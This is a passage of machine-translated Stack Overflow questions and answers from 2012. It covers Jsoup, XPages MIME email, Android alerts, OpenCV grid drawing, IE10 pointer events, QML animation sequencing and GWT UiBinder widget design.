    return null;
} 
```

**测试：**

```
Document doc = Jsoup.parse(html); // html is your listed html / xml
Strign result = searchAttribute(doc, "Second value") // result = 1 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-07T12:54:02.660

试试这个代码：

```
String searchValue = "Second value";
Elements options = doc.select("#list > option");
String value = "";
for (Element option : options) {
    String text = option.text();
    if (text.equals(searchValue)){
        value = option.attr("value");
    }
} 
```

希望能帮助到你！

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-22T20:37:59.200

我认为最简单的解决方案是：

```
 Document doc = Jsoup.parse(html);
 String value = doc.select("#list > option:contains(Second value)").val(); 
```

# xpages - xPages - 如何将文本附加到富文本字段

> ID：12318235
> 
> 赞同：1
> 
> 时间：2012-09-07T12:35:29.940
> 
> 标签：xpages, xpages-ssjs

我正在将应用程序迁移到 xpages。我有一个根据应用​​收到的电子邮件创建的文档。创建的文档上的富文本字段包含电子邮件正文。有人通过更新此字段并点击“发送”按钮来响应发件人。在它真正发出之前，我会在发送的内容中添加一些文本。我尝试了很多方法来做到这一点，但我很难过。

我知道 .getItemValue 返回一个向量，但我想我还是会试一试，但返回 null。

```
var rtiIssueField = maildoc.createRichTextItem("body");
rtiIssueField.appendText("**IMPORTANT:blah  **");
rtiIssueField.appendText("\n<LWST>");
rtiIssueField.appendText("\n"+stEntryDoc.getItemValue("Issue"));
rtiIssueField.appendText("\n</LWST>") 
```

有什么提示吗？谢谢克莱姆

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-13T18:36:28.053

非常感谢您的意见。我快到了。只有几件事要清理。但是有了你的提示，我能够做我需要的事情。我只是想我会感谢你并发布我想出的代码以防其他人需要它。

```
 var stream:NotesStream = session.createStream();
    //Grab the contents of the rt field on the web that has just been edited:
    var issueRT:NotesRichTextItem = getComponent("issue1").getValue();
    //Prefix some additional information for the customer.
    stream.writeText("**IMPORTANT: When responding, please do not include the history.  That is, remove this line and everything below it. **");
    //carriage return:
    stream.writeText("<p>");
    //Prefix a tag that will be used to strip off text if they respond WITH email history.
    stream.writeText("&lt;LWST&gt;");
    //carriage return:
    stream.writeText("<p>");
    //Prefix the 
    //Prefix a view scoped variable that contains things like date, responder, etc.
    stream.writeText(viewScope.ResponseHeader);
    //Add the contents of the rt field.
    stream.writeText( issueRT.getText() );
    //carriage return:
    stream.writeText("<p>");
    //Add the end tag.
    stream.writeText("&lt;/LWST&gt;");
    //Create the email body field.
    var emailBody:NotesMIMEEntity = maildoc.createMIMEEntity("body");
    emailBody.setContentFromText(stream,"text/html;charset=UTF-8", 1725);

    stream.close(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T03:22:26.943

在我之后说：“网络上没有 RichText，这是圣诞节过去的幽灵，只有 MIME”:-) stw

将邮箱首选项（在 names.nsf 中）设置为“首选 Mime”，将“正文”字段设置为“存储为 MIME”。这为您省去了从/到 MIME/RichtText 不断转换（可能会丢失格式）的麻烦。然后，您可以在提交时拦截 ckedit 字段或使用 doc.getMimeEntity 来获取正文字段。帮助中的 .getMimeEntity 有您正在寻找的代码示例

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-08T17:28:28.320

我创建了一个 10 旧应用程序的 XPages 版本，该应用程序将富文本（输入）添加到现有字段。这段代码听起来可能会对您有所帮助：

```
var moveAddBody = function(doc:NotesDocument){
var addRt:NotesMIMEEntity = doc.getMIMEEntity("addBody");
var attFiles:NotesRichTextItem = doc.getFirstItem("attachedFiles");
if(addRt == null && attFiles == null) return;
if(attFiles != null) {
//  println("attFiles: " + attFiles.getText() + ", length=" + attFiles.getValueLength());
}
//  if(addRt != null && @Length(addRt.getContentAsText().trim()) <= 28) return;     // The standard tags in an empty field fills 28 chars
// Something to move...
var tmpDoc:NotesDocument = doc.getParentDatabase().createDocument();            // Never saved - just left in the wind...
var mime:NotesMIMEEntity = tmpDoc.createMIMEEntity("myBody");
var stream:NotesStream = session.createStream();
var formatter = java.text.SimpleDateFormat('yyyy-MM-dd HH:mm');
var time = formatter.format(@Now());
var logLine:String = '<font size="2" color="#008080" face="sans-serif"><b>' + time + " - " + @Name("[Abbreviate]",@UserName()) + '</b></font>';
stream.writeText(logLine);
if(addRt != null && @Length(addRt.getContentAsText().trim()) > 28) {
    stream.writeText('<font size="2" face="sans-serif">');      // Enforce "simiilar" font type/size...
    stream.writeText(addRt.getContentAsText());
    stream.writeText('</font>');
}
mime.setContentFromText(stream, "text/html", NotesMIMEEntity.ENC_NONE);
var prevMime = session.isConvertMime();
session.setConvertMime(true);
tmpDoc.closeMIMEEntities(true,"myBody");
var rt:NotesRichTextItem = doc.getFirstItem("Body");
var body = null;
if (rt != null) {
    body = rt.copyItemToDocument(tmpDoc,"Body");
    rt.remove();
}
rt = doc.createRichTextItem("Body");
var rtMime:NotesRichTextItem = tmpDoc.getFirstItem("myBody");
rt.appendRTItem(rtMime);
if(attFiles != null) {
    if(addRt == null) rt.addNewLine(1);
    rt.appendRTItem(attFiles);
    attFiles.remove();
}
if(body != null) {
    rt.addNewLine(2);
    rt.appendRTItem(body);
}
if(addRt != null) {
    addRt.remove();
    addRt.recycle();
}
session.setConvertMime(prevMime);
return true;
} 
```

您将需要取出上面的一些代码，因为它还添加了日期/时间和一些格式（在有人低语“css ...”之前与 Notes 版本兼容 ;-)）。它还处理附件。

希望你能用它来解决你的问题？

/约翰

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-08T09:51:40.163

如果您想从您的应用程序创建邮件，请查看来自 OpenNTF 的 XPages Snippet：http://openntf.org/XSnippets.nsf/snippet.xsp?id=emailbean-send-dominodocument-html-emails- [cw- Embedded-images-attachments-custom-headerfooter](http://openntf.org/XSnippets.nsf/snippet.xsp?id=emailbean-send-dominodocument-html-emails-cw-embedded-images-attachments-custom-headerfooter)这个 bean 提供了你需要的一切。

# android - 如何以最终用户友好的方式处理异常

> ID：12318236
> 
> 赞同：0
> 
> 时间：2012-09-07T12:35:30.937
> 
> 标签：android

我正在开发一个 android 应用程序，我正在处理向我们的服务器发送和接收信息。请让我知道何时发生任何类型的异常我试图显示一个警报框，但**问题是警报框没有显示总是**。请帮助我提供解决方案，以便在发生异常时显示某种友好的 UI。我正在使用的警报框

```
public  void Alertbox(String title, String mymessage,Context context ) {
    new AlertDialog.Builder(context)
    .setMessage(mymessage)

    .setCancelable(true)
    .setNeutralButton(android.R.string.ok,new DialogInterface.OnClickListener()

    {
        public void onClick(DialogInterface dialog,int whichButton) {

        }
    }).show();
}

public static void ProcessDialogue(String title,Context context)
{

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T12:41:17.847

使用 Extras 字符串创建 ErrorBroadcastReceiver 和 Error ACTION。

```
public class ErrorReceiver extends BroadcastReceiver {
    public static final String ERROR_ACTION = "com.yourpackage.ERROR_ACTION";
    public static final String ERROR_MESSAGE = "ERROR_MESSAGE"; 

    @Override
    public void onReceive(Context context, Intent intent) {
        String errorMessage = intent.getStringExtra(ERROR_MESSAGE);     
        Toast.makeText(context, errorMessage, Toast.LENGTH_SHORT).show();
    }

} 
```

并将广播意图发送到此接收器

```
 Intent errorIntent = new Intent(ERROR_ACTION);
        errorIntent.putExtra(ERROR_MESSAGE , e.getMessage());// exception from try/catch block or your custom error type
        sendBroadcast(errorIntent) 
```

# c++ - 使用 OpenCV 绘制一组固定的网格线

> ID：12318239
> 
> 赞同：7
> 
> 时间：2012-09-07T12:35:39.750
> 
> 标签：c++, opencv, draw

是否可以根据 OpenCV 样本文件中颜色检测样本的输出在所有交叉点绘制用户定义的网格线？基本上，网络摄像头需要从您上方检测人的头部和肩膀。然后，当检测到一个人时，我需要网格线在那里，以便我能够知道在 x 和 y 轴（前额和后脑勺）。此后，必须将这些点发送给执行器和阀门等机械部件的操作。

我是一个入门级的 OpenCV 用户，只有关于使用 C++ 的初学者知识。我目前在 VS2008 上使用 OpenCV 2.1。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-29T16:16:25.260

很难说出你的问题到底是什么。

**如果您只想绘制网格线**，则没有 opencv 函数可以做到这一点。要在网格中绘制线条，您可以`cv::line`在循环中使用，然后使用嵌套循环绘制交叉点。

```
// assume that mat.type=CV_8UC3

dist=50;

int width=mat.size().width;
int height=mat.size().height;

for(int i=0;i<height;i+=dist)
  cv::line(mat,Point(0,i),Point(width,i),cv::Scalar(255,255,255));

for(int i=0;i<width;i+=dist)
  cv::line(mat,Point(i,0),Point(i,height),cv::Scalar(255,255,255));

for(int i=0;i<width;i+=dist)
  for(int j=0;j<height;j+=dist)
    mat.at<cv::Vec3b>(i,j)=cv::Scalar(10,10,10); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-11-06T08:24:09.260

用于使用 OpenCV 线函数在图像上绘制网格

```
Mat mat_img(image);
int stepSize = 65;

int width = mat_img.size().width;
int height = mat_img.size().height;

for (int i = 0; i<height; i += stepSize)
    cv::line(mat_img, Point(0, i), Point(width, i), cv::Scalar(0, 255, 255));

for (int i = 0; i<width; i += stepsSize)
    cv::line(mat_img, Point(i, 0), Point(i, height), cv::Scalar(255, 0, 255)); 
```

# javascript - 在不禁用 IE10 中的浏览器交互的情况下触发 MSPointerUp 事件

> ID：12318240
> 
> 赞同：3
> 
> 时间：2012-09-07T12:35:43.930
> 
> 标签：javascript, touch, multi-touch, internet-explorer-10

我正在尝试在浏览器滚动后启动一些代码。

如果我做

```
function handleDown(event) {
   console.log("down");
}

function handleUp(event) {
   console.log("up");
}

window.addEventListener("MSPointerDown", handleDown, false);
window.addEventListener("MSPointerUp", handleUp, false); 
```

与 CSS 一起

```
 html {
    -ms-content-zooming: none; /* Disable pan/zoom */
    overflow:hidden;
 } 
```

事件正确触发。但是，如果我删除 overflow:hiddem 并滚动浏览器，则不会触发 up 事件。有没有办法让浏览器通过触摸正常响应滚动但仍然触发 MSPointerUp 事件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-16T11:16:56.777

您可以使用 style="-ms-touch-action: pan-y"，这样您就可以滚动 webView，并拥有水平 MSEvents，您可以在此处找到更多选项：http: [//msdn.microsoft.com/en-我们/图书馆/windows/apps/Hh767313.aspx](http://msdn.microsoft.com/en-us/library/windows/apps/Hh767313.aspx)

# xcode - 从不同的 intunesconnect 帐户将应用上传到 AppStore

> ID：12318247
> 
> 赞同：0
> 
> 时间：2012-09-07T12:36:21.173
> 
> 标签：xcode, app-store, app-store-connect

我有一个应用程序需要从与我自己不同的 itunesconnect 帐户上传到 AppStore。在遵守 Xcode 的同时，我是否需要他们的分发证书，以便他们可以上传 .app 文件，或者我的也会这样做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T12:43:32.807

*   如果另一个 itunesconnect 帐户属于另一家公司，则不是**yes**。
*   如果它与您的公司和具有管理员级别的成员相同，则**没有**。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-05T06:55:39.800

iTunesConnect 帐户实际上独立于您用于构建应用程序的开发者帐户。

所以你需要做两件事：

1.  他们使您现有的 Apple ID 成为*团队成员*，这样您就可以拥有配置文件并获得证书来构建和签署应用程序。一旦他们这样做，每次您登录会员中心时，系统都会提示您选择一个团队，您会发现 XCode 现在可以选择团队。
2.  他们使用与当前电子邮件地址不同的电子邮件地址为您创建一个**单独的 iTunes Connect Apple ID。**这必须是您可以接收电子邮件的真实地址。

第二点似乎有点奇怪，但最终对我来说是有意义的。有一个完整的工具集，它基于您对 iTunesConnect 的唯一登录，您用于登录 iTunesConnect 的 Apple ID 意味着团队。这不仅仅是他们能够更改单个网站的情况。

我是三个团队的成员——我最初的应用程序开发公司、我的初创公司 touchgr.am 和一个客户团队。我使用那个主苹果 ID 作为我的 iTunesConnect ID 用于我的原创作品，并且不得不让人们为 iTunesConnect 添加另外两个苹果 ID。

# android - 如何从android中的xml文件获取子xml数据？

> ID：12318248
> 
> 赞同：0
> 
> 时间：2012-09-07T12:36:20.903
> 
> 标签：android, xml, listview

谁能给我Java代码以从XML文件中获取单个子XML数据并`listview`在android中打印出来？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T12:50:05.017

看看 XmlPullParserhttp://developer.android.com/reference/org/xmlpull/v1/XmlPullParser.html

里面有一个简单的例子

要将这些数据放入 ListView，您需要将 xml 读入 ArrayAdapter 并使用它来填充列表视图

# iphone - 如何将自定义 UIView 添加到情节提要场景

> ID：12318253
> 
> 赞同：9
> 
> 时间：2012-09-07T12:36:40.363
> 
> 标签：iphone, ios, xcode, uiview, storyboard

我创建了一个 UIView，里面有一个图像视图。给它起一个名字“XXXMyView”。

在我的故事板视图控制器中，我将 UIView 拖到视图控制器（场景）上，然后将其类设置为 XXXMyView。

但是当我这样做时，我看不到图像视图，而只是背景颜色。

我怎样才能看到我在显示图像视图的屏幕上创建的视图？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T15:10:11.170

你应该做的是在你的故事板中创建一个空的 UIView 。在视图上拖动 UIImageView。

然后创建一个 UIView 的子类。在故事板中，设置视图的类以匹配您最近创建的类。打开编辑器窗口（主项目窗口的右上角，“编辑器”部分的中间按钮）。将 XXXView.h 放在左侧窗口中，将情节提要放在右侧。ctrl-drag 从你的 UIImageView 到你的 .h （在`@interface`和之间`@end`）。给它一个名字。您在 UIImageView 的可视化表示和代码之间创建了一个链接。您现在可以从 .m 文件中访问它。

*Ray Wenderlich*有一个关于故事板的非常简洁的教程。这是[第 1](http://www.raywenderlich.com/5138/beginning-storyboards-in-ios-5-part-1)部分和[第 2 部分](http://www.raywenderlich.com/5191/beginning-storyboards-in-ios-5-part-2)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T14:46:23.017

也许您需要将 UIViewController 的“视图”出口设置为新的 XXXMyView。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-21T08:35:22.567

我认为您以错误的方式看待这个（据我了解）

1.  将`UIViewController`视为“主”视图并使用它的类来操作子视图（`UIView`和`UIImageView`）

2.  `UIView`将您的和`UIImageView`作为对象链接到您的`UIViewController`类中，并使用这些对象来做您需要做的事情（动态添加新的子视图或编辑属性等）

3.  您可以`UIView`使用`[yourViewObject addSubview: (UIView *)]`. 不要被`(UIView *)`你可以使用任何子类`UIView`作为参数所迷惑。（例如一个`UIImageView`物体）

如果您不知道如何将故事板中的对象链接（或引用）到课程，我建议您按照rdurand 的建议阅读*Ray Wenderlich 的**故事*板教程。这是[第 1 部分](http://www.raywenderlich.com/5138/beginning-storyboards-in-ios-5-part-1)的链接。

# qt - QML：等到动画完成

> ID：12318255
> 
> 赞同：7
> 
> 时间：2012-09-07T12:36:48.290
> 
> 标签：qt, qml

我正在尝试使可见的动画连续。我有一个 javascript 函数，它调用 myModel.move() 两次。我有一个 GridView 来显示 myModel，并且我有“x 上的行为”动画，因此我可以直观地看到这些动作。但是，两个运动动画都并行运行（它们之间的小延迟并不明显）。

我的想法是添加一个计数器，记录有多少动画已经开始，有多少已经完成。像这样的东西；

```
Behavior on x {
    NumberAnimation {
        id: animationX;
        duration: 500;
        onRunningChanged: {
            if (animationX.running) {
                console.log("Animation start");
                myModel.busy = myModel.busy + 1
            } else {
                console.log("Animation stop");
                myModel.busy = myModel.busy - 1
            }
        }
    }
} 
```

这按预期工作。然后，我在我的 javascript 函数中添加一个循环，以等待所有动画完成。

```
ListModel {
    id: myModel
    property int busy: 0
    function doSomething() {
        myModel.move(...)
        while (myModel.busy) {}
        myModel.move(...)
    }
} 
```

这是问题所在。我可以看到在第一次 move() 之后所有必要的动画都开始了，但是什么也看不到，也没有动画完成。我有某种僵局。如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:32:57.520

```
function doSomething() {
    myModel.move(...)
    while (myModel.busy) {}
    myModel.move(...)
} 
```

我不擅长 javascript。但是你为什么忙循环呢？我会创建 2 个函数。

*   第一个 make `myModel.move()`，然后为将来的事件准备字段（例如创建一个将被单击的隐藏按钮）
*   第二个将在未来事件创建时调用。对于上面的示例，它将是`Onclick`.

这似乎`onRunningChanged`是事件处理程序的定义。`onModelIdle`为什么不创建相同的，让我们称之为

```
...
   onRunningChanged: {
        if (animationX.running) {
            console.log("Animation start");
            myModel.busy = myModel.busy + 1
        } else {
            console.log("Animation stop");
            myModel.busy = myModel.busy - 1
            if(myModel.busy == 0)
              // don't know the code, but trigger the onModelIdle event which 
              // be handled below
        }
    }
...

ListModel {
   id: myModel
   ...

   onModelIdle{
       myModel.move(...)
   }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-02T14:31:56.950

这是基于#UmNyobe 的答案的有效解决方案。好吧，QML 是一种声明性语言，因此对于迭代问题是有问题的。欢迎任何意见。也许，有人可以提出更好（更易读）的纯 QML 程序，它会产生相同的效果。

```
import QtQuick 1.1
GridView {
    id: mainGrid
    cellWidth: 165; cellHeight: 95
    width: 5*cellWidth; height: 4*cellHeight
    model: myModel
    delegate: myButton
    property string animate: "no"
    property int busy: 0
    signal busyPlus
    signal busyMinus
    onBusyPlus: {
        busy++
    }
    onBusyMinus: {
        busy--
        if (busy == 0) mainGrid.model.algorithm()
    }
    ListModel {
        id: myModel
        property int step: 0
        property int one: 0
        function createModel() {
            for (var i=1; i<=20; i++) {
                append({"display": i})
            }
        }
        function algorithm() {
            if (step == 0) {
                move(0,19,1)
                one = 0
                step++
            }
            else if (step == 1) {
                if (one < 19) {
                    move(one,one+1,1)
                    one++
                    if (one == 19) step++
                }
            }
            else if (step == 2) {
                move(0,1,1)
                move(5,6,1)
                move(10,11,1)
                move(15,16,1)
                step++
            }
        }
        Component.onCompleted: {
            createModel()
            mainGrid.animate = "yes"
            algorithm()
        }
    }
    Component {
        id: myButton
        Item {
            id: item
            width: mainGrid.cellWidth-5; height: mainGrid.cellHeight-5;
            Rectangle {
                id: box
                parent: mainGrid
                x: item.x; y: item.y;
                width: item.width; height: item.height;
                border.width: 1
                Text {
                    anchors.centerIn: parent
                    text: display
                    font.pixelSize: 48
                }
                Behavior on x {
                    enabled: mainGrid.animate == "yes"
                    NumberAnimation {
                        id: animationX;
                        duration: 1000;
                        onRunningChanged: {
                            if (animationX.running) mainGrid.busyPlus()
                            else mainGrid.busyMinus()
                        }
                    }
                }
                Behavior on y {
                    enabled: mainGrid.animate == "yes"
                    NumberAnimation {
                        id: animationY;
                        duration: 1000;
                        onRunningChanged: {
                            if (animationY.running) mainGrid.busyPlus()
                            else mainGrid.busyMinus()
                        }
                    }
                }
            }
        }
    }
} 
```

# python - Python 2.7 的 MSI 安装的默认安装目录是什么？

> ID：12318264
> 
> 赞同：2
> 
> 时间：2012-09-07T12:37:11.043
> 
> 标签：python, windows, installation-path

从 python.org/download（当前版本为 2.7.3）使用 Windows MSI 安装时，python 默认安装在某个文件夹中，但没有记录此默认值是什么。有人可以在windows上检查吗？

此 MSI 安装是否识别它是 32 位还是 64 位 Windows 并安装适当的版本，还是假定它始终是 32 位版本的 python？

特别是我对使用此安装程序时在 Windows 7 上发生的情况感兴趣。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-07T12:38:39.687

默认安装文件夹是 c:/python27

# java - GWT 表示层：谁做什么？

> ID：12318266
> 
> 赞同：7
> 
> 时间：2012-09-07T12:37:25.523
> 
> 标签：java, gwt, widget, uibinder, gwt-designer

我正在学习 GWT，并试图围绕所有 UI 选项。我试图弄清楚何时/何地/如何使用小部件、UIBinder、GWT 设计器和自定义小部件。具体来说：

*   GWT Designer 生成什么作为输出？UIBinder XML？当您不想手动编码 UIBinder XML 时可以使用 GWT Designer 是否安全，但它们都服务于相同的确切目的？
*   何时在小部件上使用 UIBinder？是不是 Widget 被翻译成 UIBinder XML，但其中包含更多代码（事件处理等）？在那种情况下，我会*假设*UIBinder XML 的优点是代码更少，因此性能更快？在两者之间进行选择时还应考虑其他因素吗？
*   您是编写大量 UIBinder XML“片段”还是将它们全部打包到一个大的整体 XML 文件中？
*   `com.google.gwt.user.client.ui.*`对于制作我自己的自定义组件，扩展和扩展有什么区别`com.google.gwt.user.client.ui.Composite`？
*   分工：Widgets/UIBinder vs. Layouts vs CSS files：谁做什么？

对我来说，我觉得所有这些东西都做同样的事情，也许这只是 GWT 为您提供多种方式来完成演示的方式？如果没有，请在这些项目上纠正我。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-07T14:19:29.813

*   当小部件非常简单时，我只在 UiBinder 上使用小部件。例如，我只是将两个小部件添加到`Panel`. 如果涉及任何 CSS，我总是使用 UiBinder，因为它更容易使用样式。

*   小部件不会被翻译成 UiBinder XML。所有 GWT 代码都变成了添加和操作 DOM 元素的 JavaScript，因此所有内容都被转换为可执行语言，而不是模板系统。

*   我写了很多 UiBinder 片段。我尝试遵循您可以在网络上找到的关于抽象和组合的良好规则。

*   如果您有任何重要的逻辑，MVP 模式是必须的，因为使用 JUnit 测试无 GWT 的演示者非常快速和容易，而 GWT 测试的开销要大得多，而且速度要慢得多。

*   我喜欢在 CSS 文件中保留尽可能多的样式，因为分离关注点是一种标准的好习惯，您可以压缩和捆绑您的 CSS 文件，以及许多其他原因，这些原因与您在普通 HTML 页面中放置 CSS 的原因相同在单独的文件中，而不是直接在页面上。

*   我从不使用 GWT 设计器。我总是更喜欢干净的代码，而不是通常由任何 UI 代码生成器吐出的疯狂垃圾。

*   99% 的情况下，我的小部件会扩展`Composite`，因为要么我正在使用 UiBinder，要么我正在向`Panel`. 即使我只有一个小部件，我发现扩展`Composite`并将我的一个小部件添加到`SimplePanel`. 我很少扩展`Widget`，因为你必须调用来`Document.get().createFooElement()`创建一个 DOM `Element`，但我通常发现`Widget`s，可以添加到`Panel`s，比`Element`s更容易和更安全

## 我如何构建小部件

每个小部件都实现了一个扩展接口`IsWidget`。每个想要使用的人都`Widget`应该依赖于接口，而不是底层类。这提供了一个单一的、无 JSNI 的抽象。

如果小部件非常简单，我将有一个扩展`Composite`和实现接口的类。小部件将非常简单并向 a 添加一些项目，`Panel`或者它将使用 UiBinder。

如果小部件有我想测试的重要逻辑，我使用 MVP 模式。将有一个实现小部件的“公共”接口的演示者类，一个扩展`IsWidget`演示者所依赖的视图接口，以及一个实现视图接口的视图小部件。

为小部件提供单个“公共”接口的一个好处是，如果逻辑变得复杂，您可以从使用单个`Composite`类实现接口更改为使用 MVP，并且使用小部件的人根本不需要更改。

我使用 Gin 将所有接口和实现连接在一起。

## 例子

这最好用一些代码来解释。假设我有一个要在多个页面上使用的图表，所以我决定为它制作一个可重复使用的小部件。在显示之前处理 RPC 响应有一些重要的逻辑，所以我想对它进行彻底的单元测试。我会用这样的东西：

```
public interface FinancialChart extends IsWidget {
  void setTickerSymbol(String tickerSymbol);
}

class FinancialChartPresenter extends Composite implements FinancialChart {
  private final FinancialChartView view;      
  private final DataServiceAsync service;

  @Inject(FinancialChartView view, DataServiceAsync service) {
    this.view = view;
    this.service = service;
  }

  @Override public Widget asWidget() {
    return view.asWidget();
  }

  @Override public void setTickerSymbol(String tickerSymbol) {
    service.getData(tickerSymbol, new AsyncCallback<FinancialData>() {
      @Override public void onFailure(Throwable t) {
        // handle error
      }

      @Override public void onSuccess(FinancialData data) {
        SimpleData simpleData = // do some parsing with presentation-specific
          // logic, e.g. make dramatic increases or decreases in price have a
          // a different color so they stand out.  End up with something simple
          // that's essentially some (x, y) points that the dumb view can plot
          // along with a label and color for each point.
        view.drawGraph(simpleData);
      }
  }
}

interface FinancialChartView extends IsWidget {
  void drawGraph(SimpleData simpleData);
}

class FinancialChartWidget extends Composite implements FinancialChartView {
  @Override public void drawGraph(SimpleData simpleData) {
    // plot the points on a chart.  set labels.  etc.
  }
}

class SomethingWithFinancialChartWidget extends Composite
    implements SomethingWithFinancialChart {
  interface Binder extends UiBinder<Widget, SomethingWithFinancialChartWidget> {}

  @UiField(provided = true) final FinancialChart chart;

  @Inject SomethingWithFinancialChartWidget(Binder binder, FinancialChart chart) {
    this.chart = chart;
    initWidget(binder.createAndBindUi(this));
  }
}

// In SomethingWithFinancialChartWidget.ui.xml
<ui:HTMLPanel>
  <!-- lots of stuff -->
  <mynamespace:FinancialChart ui:field="chart" />
  <!-- lots more stuff -->
</ui:HTMLPanel>

class MyPackagesGinModule extends AbstractGinModule {
  @Override protected void configure() {
    bind(FinancialChart.class).to(FinancialChartPresenter.class);
    bind(FinancialChartView.class).to(FinancialChartWidget.class);
  }
} 
```

这允许我为 JSNI 编写非常简单、彻底和快速的 JUnit 测试，`FinancialViewPresenter`因为它没有需要 JSNI 的 GWT 依赖项，它必须作为慢得多的 GWT 测试用例的一部分在浏览器中运行。您可以创建一个模拟`FinancialChartView`.

这里要注意的一件事是，由于`SomethingWithFinancialChartWidget`依赖于 interface `FinancialChart`，它不能实例化该对象，因为它只是一个接口。这就是为什么在 .java 代码中`chart`设置的原因。Gin 设置从接口到具体类的绑定，以便它可以为 的构造函数提供实现，然后设置为 UiBinder 提供所需的对象。`@UiField(provided = true)``SomethingWithFinancialChartWidget``FinancialChart``@Inject``SomethingWithFinancialChartWidget``this.chart`

`FinancialChart`在 MVP 中为所有接口和实现创建了许多文件，但抽象是绝对值得的，因为它们使演示者的单元测试变得容易，并允许您更改在此示例中的顶级接口的实现方式，例如，从单个`Composite`类更改为 MVP，无需客户端更改。

我确信有一些实现细节可能不是很清楚，或者我掩盖了一些事情，例如 GWT 测试，所以请发表评论，我可以编辑我的答案以更新和澄清。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T15:48:27.717

让我们与您的问题保持距离，并立即回答整体问题。但首先，我最喜欢的标语：

> > *没有魔法！*

UiBinder 是一个接受 XML 定义并从中生成 Java 代码的工具。也就是说（对于通过调用构造的所有内容都是如此`GWT.create()`：*没有魔法！*）您可以用Java代码手动编写相同的内容。换句话说，UiBinder 只是一个让你**更有效率**的工具，它需要更少的代码来实现相同的目标。但是由于它生成的代码你可以手工编写，它不会在运行时提供更好的性能（也不会更糟）；然而，它更容易使用导致更好性能的模式，即`HTMLPanel`：在纯 Java 中维护`HTMLPanel`基于代码的代码是一场噩梦，而与 UiBinder 完全相反。

UiBinder 将：

*   生成一个隐含`ClientBundle`的，`CssResource`每个`<ui:style>`隐含的`ImageResource`，每个隐含的，每个`<ui:image>`隐含`DataResource`的`<ui:data>`
*   `Messages`为 I18N out of`<ui:msg>`等生成一个隐式接口`<ui:ph>`。
*   根据XML 中的属性和Java 代码中的注释，将对象注入到伙伴对象（称为*所有者*并作为参数传递给`createAndBindUi`方法）的字段中；或者可能从伙伴对象中检索它们，如果注释有`ui:field``@UiField``provided=true`
*   使用各种专门的解析器，或带`@UiConstructor`注释的构造函数，或`@UiFactory`伙伴对象的带注释的方法来创建对象，或者作为最后的手段使用`GWT.create()`调用
*   合作伙伴对象的bind `@UiHandler`-annotated 方法作为 XML 模板中小部件的事件处理程序（基于`ui:field`属性）
*   最后但同样重要的是：将所有这些构造的对象组装在一起，并设置它们的一些属性（在 XML 中的属性之外）。

UiBinder 最常见的用途是让我上面谈到的那些*对象成为小部件。*组装它们意味着将小部件添加到其他容器小部件中。
这就是为什么您通常会在 a 中看到 UiBinder 用于`Composite`为方法提供值的原因`initWidget()`：UiBinder 将创建并组合所有需要的小部件，并返回最顶层的小部件，用作复合小部件的根。

你已经明白了：你不会*在 widgets 上使用 UiBinder*，而且 widgets 也不会被*翻译成 UiBinder XML*（实际上恰恰相反）。

现在回答您更具体的问题：

> 您是编写大量 UIBinder XML“片段”还是将它们全部打包到一个大的整体 XML 文件中？

UiBinder 是一种*实现细节*。大多数时候，您将使用 UiBinder 构建（可重用）小部件（组合）；它不会传到外面的世界，它只会看到一个小部件，而不是“用 UiBinder 构建的东西”。
这意味着您将拥有许多中小型 UiBinder 模板（通常，您的应用程序中的每个*屏幕*至少一个，或者更一般的规则，每个*复杂的 UI 组件*一个）。

> 为了制作我自己的自定义组件，扩展 com.google.gwt.user.client.ui.* 与 com.google.gwt.user.client.ui.Composite 有什么区别？

Ümit 回答了那个问题，以及文档：[https ://developers.google.com/web-toolkit/doc/latest/DevGuideUiCustomWidgets](https://developers.google.com/web-toolkit/doc/latest/DevGuideUiCustomWidgets)

> 分工：Widgets/UIBinder vs. Layouts vs CSS files：谁做什么？

不幸的是，没有简单的答案。*这取决于。*

这取决于您正在构建的应用程序类型以及您想要的 UI 类型。对于应用程序的“全局布局”，您将使用几个`RootPanel`或一个 big`HTMLPanel`并使用 HTML 和 CSS 进行布局（在 HTML 主机页面中，或在 UiBinder 模板中作为应用程序的*外壳*），或者您将使用所谓的[布局面板](https://developers.google.com/web-toolkit/doc/latest/DevGuideUiPanels#LayoutPanels)。

对于更*本地化*的布局（在复合小部件内），我建议使用`HTMLPanel`or `FlowPanel`; 或可能的布局面板。如果您需要处理滚动事件，或者如果您需要在容器小部件内滚动，则使用 a `ScrollPanel`，否则只需`overflow: scroll`在 CSS 中使用。

有权衡。你必须做实验。最后，**使用你认为对你有好处的东西**。没有一种万能的。

* * *

最后，虽然它是最常见的用例，但请注意 UiBinder 可以在没有小部件的情况下使用，例如[创建非复合小部件](https://developers.google.com/web-toolkit/doc/latest/DevGuideUiBinder#Hello_World)（或`UiObject`s，但它们的用例很少；您会看到它们用于`MenuItem`s 和`TreeItem`s例如），使用`setElement()`而不是`initWidget()`，或[创建自定义 Cells](https://developers.google.com/web-toolkit/doc/latest/DevGuideUiBinder#Rendering_HTML_for_Cells)。
实际上，两者都没有太多用例`Composite`：您可以简单地实现`IsWidget`（返回 的结果`createAndBindUi`，调用一次并缓存在私有字段中），它应该可以在任何预期/接受小部件的地方工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T14:36:56.357

